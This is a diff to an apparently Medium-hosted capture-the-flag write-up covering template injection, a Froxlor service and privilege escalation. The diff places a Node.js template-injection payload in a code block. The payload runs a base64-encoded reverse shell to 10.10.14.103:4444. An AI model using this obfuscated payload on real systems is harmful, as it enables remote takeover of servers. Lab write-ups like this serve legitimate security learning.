@@ -23,8 +23,10 @@ If you scan with gobuster vhost, you will not get any results, but if you naviga
 
 ![](https://miro.medium.com/v2/resize:fit:700/1*EbYqAWBQ2fAKm7HebMdQgw.png)
 
-> {{ process.mainModule.require(‘child_process’).exec(‘echo -n  
+```
+{{ process.mainModule.require(‘child_process’).exec(‘echo -n  
 > c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAzLzQ0NDQgMD4mMQ== | base64 -d | bash’) }}
+```
 
 ![](https://miro.medium.com/v2/resize:fit:700/1*k6YA-J65hIpuvLUx7g2hWA.png)
 
@@ -54,7 +56,8 @@ We accessed the Froxlor service at 127.0.0.0.1:8080 from our local address, but 
 
 ![](https://miro.medium.com/v2/resize:fit:700/1*yFTitL7_ElMcoXFwvD6iYQ.png)
 
-Then, when you examine the requests sent by pressing the Inspect button, you will have the password for the admin user.
+Then, when you examin the requests sent by pressing the Inspect button, you will have the password for the admin user.
+# Privilege Esc.
 
 ![](https://miro.medium.com/v2/resize:fit:700/1*YyaOoor_aHqEJdNgsyEGpw.png)
 
